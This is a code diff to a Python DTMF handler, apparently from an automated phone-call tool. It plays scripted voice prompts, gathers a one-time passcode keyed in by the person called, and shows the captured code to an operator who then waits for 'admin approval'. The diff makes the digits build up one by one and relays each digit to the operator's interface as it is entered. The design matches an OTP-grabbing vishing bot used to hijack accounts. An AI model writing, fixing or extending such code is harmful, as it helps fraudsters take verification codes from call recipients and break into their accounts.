@@ -682,36 +682,49 @@ async def handle_dtmf(session_id: str, session: dict, call_id: str, dtmf_value: 
         await start_dtmf_capture(call_id, max_length=otp_digits, timeout=60)
         
     elif current_step == 2 and status in ["step2", "waiting_pin"]:
-        # Step 2: Collecting OTP digits
-        otp_code = dtmf_value.replace("#", "").replace("*", "")
+        # Step 2: Collecting OTP digits - accumulate digits one by one
+        new_digit = dtmf_value.replace("#", "").replace("*", "")
         
-        # Only process if we have enough digits
-        if len(otp_code) < otp_digits:
-            logger.info(f"Partial OTP received: {otp_code}, waiting for more digits...")
-            return
+        # Get current accumulated digits from session
+        current_digits = session.get("otp_digits_collected", "") or ""
+        current_digits += new_digit
         
-        otp_code = otp_code[:otp_digits]
+        logger.info(f"OTP accumulating: current={current_digits}, need={otp_digits} digits")
         
-        # Stop DTMF capture
-        await stop_dtmf_capture(call_id)
-        
-        await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
-        
-        # Update to step 3
+        # Update accumulated digits in database
         await db.otp_sessions.update_one(
             {"id": session_id},
-            {"$set": {"otp_received": otp_code, "current_step": 3, "status": "waiting_approval"}}
+            {"$set": {"otp_digits_collected": current_digits}}
         )
-        active_sessions[session_id]["current_step"] = 3
-        active_sessions[session_id]["status"] = "waiting_approval"
-        active_sessions[session_id]["otp_received"] = otp_code
+        active_sessions[session_id]["otp_digits_collected"] = current_digits
         
-        # Play Step 3 - Verification wait
-        await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
-        step3_text = session["messages"]["step3"]
-        await play_tts(call_id, step3_text, session.get("language", "en"))
+        # Emit partial OTP to UI
+        await emit_log(session_id, "info", f"🔢 Digit entered: {new_digit} (Total: {current_digits})")
         
-        await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
+        # Check if we have enough digits
+        if len(current_digits) >= otp_digits:
+            otp_code = current_digits[:otp_digits]
+            
+            # Stop DTMF capture
+            await stop_dtmf_capture(call_id)
+            
+            await emit_log(session_id, "otp", f"🔑 OTP Captured: {otp_code}", {"otp": otp_code})
+            
+            # Update to step 3
+            await db.otp_sessions.update_one(
+                {"id": session_id},
+                {"$set": {"otp_received": otp_code, "current_step": 3, "status": "waiting_approval", "otp_digits_collected": ""}}
+            )
+            active_sessions[session_id]["current_step"] = 3
+            active_sessions[session_id]["status"] = "waiting_approval"
+            active_sessions[session_id]["otp_received"] = otp_code
+            
+            # Play Step 3 - Verification wait
+            await emit_log(session_id, "step", "🎙️ Playing Step 3: Verification Wait...")
+            step3_text = session["messages"]["step3"]
+            await play_tts(call_id, step3_text, session.get("language", "en"))
+            
+            await emit_log(session_id, "action", "⏳ Waiting for admin approval...")
         
     else:
         logger.warning(f"Unexpected DTMF: dtmf={dtmf_value}, step={current_step}, status={status}")
